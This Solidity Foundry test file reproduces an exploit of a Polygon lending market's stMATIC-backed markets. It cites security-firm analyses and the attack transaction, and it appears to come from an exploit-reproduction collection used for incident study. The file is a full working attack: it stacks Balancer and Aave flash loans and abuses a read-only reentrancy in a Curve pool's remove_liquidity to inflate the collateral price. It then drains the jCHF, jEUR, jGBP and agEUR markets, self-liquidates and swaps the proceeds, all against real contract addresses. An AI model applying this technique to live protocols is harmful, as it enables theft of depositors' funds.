// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1614774855999844352
// https://twitter.com/BlockSecTeam/status/1614864084956254209
// @TX
// https://polygonscan.com/tx/0x0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f

interface PriceProvider {
    function getUnderlyingPrice(address cTokens) external view returns (uint256);
}

interface ICurvePools is ICurvePool {
    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts, bool donate_dust) external;
    function remove_liquidity_one_coin(uint256 token_amount, uint256 i, uint256 min_amount, bool use_eth) external;
}

contract LiquidateContract {
    ICErc20Delegate WMATIC_STMATIC = ICErc20Delegate(0x23F43c1002EEB2b146F286105a9a2FC75Bf770A4);
    ICErc20Delegate FJCHF = ICErc20Delegate(0x62Bdc203403e7d44b75f357df0897f2e71F607F3);
    ICErc20Delegate FJEUR = ICErc20Delegate(0xe150e792e0a18C9984a0630f051a607dEe3c265d);
    ICErc20Delegate FJGBP = ICErc20Delegate(0x7ADf374Fa8b636420D41356b1f714F18228e7ae2);
    ICErc20Delegate FAGEUR = ICErc20Delegate(0x5aa0197D0d3E05c4aA070dfA2f54Cd67A447173A);
    IERC20 STMATCI_F = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);

    function liquidate(address receiver) external payable {
        IERC20(FJCHF.underlying()).approve(address(FJCHF), type(uint256).max);
        IERC20(FJEUR.underlying()).approve(address(FJEUR), type(uint256).max);
        IERC20(FJGBP.underlying()).approve(address(FJGBP), type(uint256).max);
        IERC20(FAGEUR.underlying()).approve(address(FAGEUR), type(uint256).max);

        FJCHF.liquidateBorrow(receiver, IERC20(FJCHF.underlying()).balanceOf(address(this)), address(WMATIC_STMATIC));
        FJEUR.liquidateBorrow(receiver, IERC20(FJEUR.underlying()).balanceOf(address(this)), address(WMATIC_STMATIC));
        FJGBP.liquidateBorrow(receiver, IERC20(FJGBP.underlying()).balanceOf(address(this)), address(WMATIC_STMATIC));
        FAGEUR.liquidateBorrow(receiver, IERC20(FAGEUR.underlying()).balanceOf(address(this)), address(WMATIC_STMATIC));
        WMATIC_STMATIC.redeem(WMATIC_STMATIC.balanceOf(address(this)));
        STMATCI_F.transfer(receiver, STMATCI_F.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IUnitroller unitroller = IUnitroller(0xD265ff7e5487E9DD556a4BB900ccA6D087Eb3AD2);
    ICurvePools curvePool = ICurvePools(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    ICurvePools EURCurvePool = ICurvePools(0x2fFbCE9099cBed86984286A54e5932414aF4B717);
    PriceProvider oraclePrice = PriceProvider(0xb9e1c2B011f252B9931BBA7fcee418b95b6Bdc31);
    ICErc20Delegate WMATIC_STMATIC = ICErc20Delegate(0x23F43c1002EEB2b146F286105a9a2FC75Bf770A4);
    ICErc20Delegate FJCHF = ICErc20Delegate(0x62Bdc203403e7d44b75f357df0897f2e71F607F3);
    ICErc20Delegate FJEUR = ICErc20Delegate(0xe150e792e0a18C9984a0630f051a607dEe3c265d);
    ICErc20Delegate FJGBP = ICErc20Delegate(0x7ADf374Fa8b636420D41356b1f714F18228e7ae2);
    ICErc20Delegate FAGEUR = ICErc20Delegate(0x5aa0197D0d3E05c4aA070dfA2f54Cd67A447173A);
    IDMMExchangeRouter KyberRouter = IDMMExchangeRouter(0x546C79662E028B661dFB4767664d0273184E4dD1);
    Uni_Router_V3 UniRouter = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 STMATCI_F = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
    IERC20 STMATCI = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    address amWMATIC = 0x8dF3aad3a84da6b69A4DA8aeC3eA40d9091B2Ac4;
    address aPolWMATIC = 0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97;
    uint256 balancerFlashloanAmount;
    uint256 aaveV3FlashloanAmount;
    uint256 aaveV2FlashloanAmount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("https://polygon.llamarpc.com", 38_118_347);
        cheats.label(address(balancer), "balancer");
        cheats.label(address(aaveV3), "aaveV3");
        cheats.label(address(aaveV2), "aaveV2");
        cheats.label(address(unitroller), "unitroller");
        cheats.label(address(curvePool), "curvePool");
        cheats.label(address(EURCurvePool), "EURCurvePool");
        cheats.label(address(oraclePrice), "oraclePrice");
        cheats.label(address(WMATIC_STMATIC), "WMATIC_STMATIC");
        cheats.label(address(KyberRouter), "KyberRouter");
        cheats.label(address(UniRouter), "UniRouter");
        cheats.label(address(oraclePrice), "oraclePrice");
        cheats.label(address(FJCHF), "FJCHF");
        cheats.label(address(FJEUR), "FJEUR");
        cheats.label(address(FJGBP), "FJGBP");
        cheats.label(address(FAGEUR), "FAGEUR");
        cheats.label(address(WMATIC), "WMATIC");
        cheats.label(address(STMATCI_F), "STMATCI_F");
        cheats.label(address(STMATCI), "STMATCI");
        cheats.label(address(USDC), "USDC");
    }

    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        balancerFlashloan();

        emit log_named_decimal_uint(
            "Attacker WMATIC balance after exploit", WMATIC.balanceOf(address(this)), WMATIC.decimals()
        );
    }

    function balancerFlashloan() internal {
        balancerFlashloanAmount = WMATIC.balanceOf(address(balancer));
        address[] memory tokens = new address[](1);
        tokens[0] = address(WMATIC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = balancerFlashloanAmount;
        bytes memory userData = "";
        balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // balancerFlashloan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        aaveV3Flashloan();
        WMATIC.transfer(address(balancer), balancerFlashloanAmount);
    }

    function aaveV3Flashloan() internal {
        aaveV3FlashloanAmount = WMATIC.balanceOf(aPolWMATIC);
        address[] memory assets = new address[](1);
        assets[0] = address(WMATIC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveV3FlashloanAmount;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function aaveV2Flashloan() internal {
        aaveV2FlashloanAmount = WMATIC.balanceOf(amWMATIC);
        address[] memory assets = new address[](1);
        assets[0] = address(WMATIC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveV2FlashloanAmount;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    // aaveFlashloan callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        if (msg.sender == address(aaveV3)) {
            WMATIC.approve(address(aaveV3), type(uint256).max);
            aaveV2Flashloan();
            return true;
        } else {
            WMATIC.approve(address(aaveV2), type(uint256).max);
            address[] memory cTokens = new address[](5);
            cTokens[0] = address(WMATIC_STMATIC);
            cTokens[1] = address(FJCHF);
            cTokens[2] = address(FJEUR);
            cTokens[3] = address(FJGBP);
            cTokens[4] = address(FAGEUR);
            unitroller.enterMarkets(cTokens);
            WMATIC.approve(address(curvePool), type(uint256).max);
            STMATCI_F.approve(address(WMATIC_STMATIC), type(uint256).max);
            curvePool.add_liquidity([uint256(0), uint256(270_000 * 1e18)], 0);
            uint256 mintAmount = STMATCI_F.balanceOf(address(this));
            WMATIC_STMATIC.mint(mintAmount); // deposit collateral
            uint256 WMMATICAmount = WMATIC.balanceOf(address(this));
            console.log(
                "Before reentrancy collateral price", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18
            );
            uint256 LPAmount = curvePool.add_liquidity([uint256(0), WMMATICAmount], 0);
            curvePool.remove_liquidity(LPAmount, [uint256(0), uint256(0)], true); // reentrancy point
            liquidate();
            curvePool.remove_liquidity_one_coin(STMATCI_F.balanceOf(address(this)), 1, 0, false);
            swapAll();
            return true;
        }
    }

    receive() external payable {
        if (msg.sender == address(curvePool)) {
            console.log(
                "After reentrancy collateral price", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18
            );
            borrowAll();
        }
    }

    function borrowAll() internal {
        FJCHF.borrow(IERC20(FJCHF.underlying()).balanceOf(address(FJCHF)));
        FJEUR.borrow(425_500 * 1e18);
        // FJEUR.borrow(IERC20(FJEUR.underlying()).balanceOf(address(FJEUR)));
        FJGBP.borrow(IERC20(FJGBP.underlying()).balanceOf(address(FJGBP)));
        FAGEUR.borrow(IERC20(FAGEUR.underlying()).balanceOf(address(FAGEUR)));
    }

    function liquidate() internal {
        LiquidateContract liquidateContract = new LiquidateContract();
        IERC20(FJCHF.underlying()).transfer(address(liquidateContract), 22_214_068_291_997_556_144_357);
        IERC20(FJEUR.underlying()).transfer(address(liquidateContract), 57_442_500_000_000_000_000_000);
        IERC20(FJGBP.underlying()).transfer(address(liquidateContract), 4_750_000_000_000_000_000_000);
        IERC20(FAGEUR.underlying()).transfer(address(liquidateContract), 4_769_452_686_674_485_072_297);
        liquidateContract.liquidate(address(this));
    }

    function swapAll() internal {
        JCHFToUSDC();
        JEURToUSDC();
        JGBPToUSDC();
        AGEURToUSDC();
        USDCToWMATIC();
        STMATCI.approve(address(curvePool), type(uint256).max);
        curvePool.add_liquidity([STMATCI.balanceOf(address(this)), uint256(0)], 0);
        curvePool.remove_liquidity_one_coin(STMATCI_F.balanceOf(address(this)), 1, 0, false);
        address(WMATIC).call{value: address(this).balance}("");
    }

    function JCHFToUSDC() internal {
        IERC20 JCHF = IERC20(FJCHF.underlying());
        JCHF.approve(address(KyberRouter), type(uint256).max);
        address[] memory poolsPath = new address[](1);
        poolsPath[0] = address(0x439E6A13a5ce7FdCA2CC03bF31Fb631b3f5EF157);
        IERC20[] memory path = new IERC20[](2);
        path[0] = JCHF;
        path[1] = USDC;
        KyberRouter.swapExactTokensForTokens(
            JCHF.balanceOf(address(this)), 0, poolsPath, path, address(this), block.timestamp
        );
    }

    function JEURToUSDC() internal {
        IERC20 JEUR = IERC20(FJEUR.underlying());
        JEUR.approve(address(KyberRouter), type(uint256).max);
        address[] memory poolsPath = new address[](1);
        poolsPath[0] = address(0xa1219DBE76eEcBf7571Fed6b020Dd9154396B70e);
        IERC20[] memory path = new IERC20[](2);
        path[0] = JEUR;
        path[1] = USDC;
        KyberRouter.swapExactTokensForTokens(150_000 * 1e18, 0, poolsPath, path, address(this), block.timestamp);
    }

    function JGBPToUSDC() internal {
        IERC20 JGBP = IERC20(FJGBP.underlying());
        JGBP.approve(address(KyberRouter), type(uint256).max);
        address[] memory poolsPath = new address[](1);
        poolsPath[0] = address(0xbb2d00675B775E0F8acd590e08DA081B2a36D3a6);
        IERC20[] memory path = new IERC20[](2);
        path[0] = JGBP;
        path[1] = USDC;
        KyberRouter.swapExactTokensForTokens(
            JGBP.balanceOf(address(this)), 0, poolsPath, path, address(this), block.timestamp
        );
    }

    function AGEURToUSDC() internal {
        IERC20 AGEUR = IERC20(FAGEUR.underlying());
        IERC20 JEUR = IERC20(FJEUR.underlying());
        JEUR.approve(address(EURCurvePool), type(uint256).max);
        EURCurvePool.exchange(1, 0, JEUR.balanceOf(address(this)), 0);
        AGEUR.approve(address(UniRouter), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(AGEUR),
            tokenOut: address(USDC),
            fee: 100,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: AGEUR.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UniRouter.exactInputSingle(_Params);
    }

    function USDCToWMATIC() internal {
        USDC.approve(address(UniRouter), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WMATIC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UniRouter.exactInputSingle(_Params);
    }
}
